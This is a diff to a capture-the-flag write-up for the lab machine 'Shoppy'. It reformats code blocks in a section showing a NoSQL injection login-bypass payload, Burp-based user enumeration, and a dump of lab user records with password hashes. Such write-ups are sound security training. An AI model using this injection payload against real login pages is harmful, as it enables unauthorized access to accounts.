@@ -57,7 +57,7 @@ we have found the /Login directory
 
 ## Port 9093
 
-~~~ url
+~~~ text
 http://shoppy.htb:9093/
 ~~~
 
@@ -69,7 +69,7 @@ The port 9093 on the web browser returns some kind of log:
 
 We use this payload for NoSQLi 
 
-~~~ payload
+~~~ sql
 test' || '1'=='1
 ~~~
 
@@ -96,7 +96,7 @@ We intercept the user search request with our burpsuite and send it to the intru
 
 We get two valid users (admin/josh)
 
-~~~ users
+~~~ text
 admin
 josh
 ~~~
@@ -125,7 +125,9 @@ Now when we make the report from the download button we obtain the two users ins
 ![alt text](/assets/img/Pasted%20image%2020240320221515.png)
 
 ~~~ data
-[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
+
+{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
 ~~~
 
 ## Cracking Passwords
